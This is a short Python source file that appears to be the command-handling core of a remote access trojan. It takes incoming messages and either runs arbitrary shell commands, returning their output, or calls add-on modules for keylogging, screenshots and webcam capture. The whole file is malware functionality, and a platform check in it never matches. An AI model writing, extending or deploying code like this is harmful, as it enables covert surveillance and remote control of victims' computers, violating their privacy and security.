import subprocess
import addons
import os

if  os.name=="nt":
	os_type = "win"
else:
	os_type = "unix"

def distribute(messageSent):
	if messageSent.find ( 'cmd' ) != -1:
		return exec_cmd(messageSent.split(':')[1])
	elif messageSent.find ( 'keylogger' ) != -1:
		if os_type == "win":
			return addons.keylogger.keylogger_win(10)
		elif os_type == "linux":
			return "404 - Request not found"
	elif messageSent.find("screenshot") != -1:
		return addons.screenshot.screenshot()
	elif messageSent.find("webcam") != -1:
		return addons.webcam.webcam()
	else:
		return "404 - Request not found"
	

def exec_cmd(cmd):
	try :
		output =  subprocess.Popen(cmd, stdout=subprocess.PIPE,shell=True).communicate()[0]
		return output.replace("\r"," - ").replace("\n"," - ")
	except :
		output = "FAILED"
		return output